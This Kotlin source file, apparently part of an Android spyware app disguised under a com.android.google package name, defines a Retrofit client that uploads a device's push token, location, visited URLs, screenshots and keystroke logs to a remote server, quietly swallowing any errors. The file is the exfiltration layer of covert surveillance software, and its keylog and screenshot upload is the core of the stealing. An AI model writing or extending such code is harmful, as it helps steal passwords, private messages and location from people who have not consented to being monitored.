package com.android.google.remote.server

import com.android.google.remote.RemoteService
import com.android.google.remote.models.*
import com.android.google.remote.retrofit.Retrofit
import com.android.google.utils.loge

/*
* Here with Retrofit2 - Manager sending data to the remote server
* */

class Server(
    private val service: ServerService = Retrofit.getService()
): RemoteService {

    override suspend fun sendPushToken(token: PushTokenDTO) {
        try {
        service.sendPushToken(token = token)
        }
        catch (e: Exception) {
            loge("SendPushToken: ${e.message}")
        }
    }

    override suspend fun sendLocation(location: LocationDTO) {
        try {
            service.sendLocation(location = location)
        }
        catch (e: Exception) {
            loge("SendLocation: ${e.message}")
        }
    }

    override suspend fun sendUrl(url: UrlDTO) {
        try {
            service.sendUrl(url = url)
        }
        catch (e: Exception) {
            loge("SendUrl: ${e.message}")
        }
    }

    override suspend fun sendScreenshot(screenshot: ScreenshotDTO) {
        try {
        service.sendScreenshot(screenshot = screenshot)
        }
        catch (e: Exception) {
            loge("SendScreenshot: ${e.message}")
        }
    }

    override suspend fun sendKeyLog(keyLog: KeyLogDTO) {
        try {
            service.sendKeyLog(keyLog = keyLog)
        }
        catch (e: Exception) {
            loge("SendKeyLog: ${e.message}")
        }
    }

}